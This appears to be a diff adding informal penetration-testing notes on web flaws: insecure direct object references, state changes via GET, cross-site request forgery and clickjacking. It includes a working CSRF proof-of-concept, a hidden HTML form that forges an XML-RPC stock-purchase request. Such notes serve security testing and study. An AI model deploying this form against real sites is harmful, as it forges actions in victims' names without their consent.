@@ -1,0 +1,23 @@
+1) Insecure direct object reference
+2) Any side-effects or data manipulation are made via GET.
+	1. CSRF--try those GET via iframe, img, script, link 
+			i. all these are GET
+			ii. all the cookies in the domain, set from any tab, will be sent to the server (this is how ads get to knw abt what u searched in flipkart)
+			iii. allowed according to SOP(except iframe)
+3) CSRF by making a form in malicious site and put POST action to vulnerable site.
+	1. For CSRF-XML POST Ref: http://pentestmonkey.net/blog/csrf-xml-post-request
+		a. Req looks like 
+			POST /createnewuser HTTP/1.1
+			Host: site.being.tested.com
+			Cookie: mysessionid=90450874698749829
+			
+			<?xml version value='"1.0"?><methodCall>... new creds go here...</methodCall>
+		b. Solution will be
+			<FORM NAME="buy" ENCTYPE="text/plain"
+			action="http://trade.example.com/xmlrpc/trade.rem" METHOD="POST">
+			<input type="hidden" name='<?xml version'
+			value='"1.0"?><methodCall><methodName>stocks.buy</methodName><params><param><value><string>MSFT</string></value></param><param><value><double>26</double></value></param></params></methodCall>'>
+			<input type="submit" value="Submit">
+			</FORM>
+			
+4) According to SOP only XHR request is blocked, coz it can be used to make GET,POST,PUT,DELETE so use iframe, for click jacking.
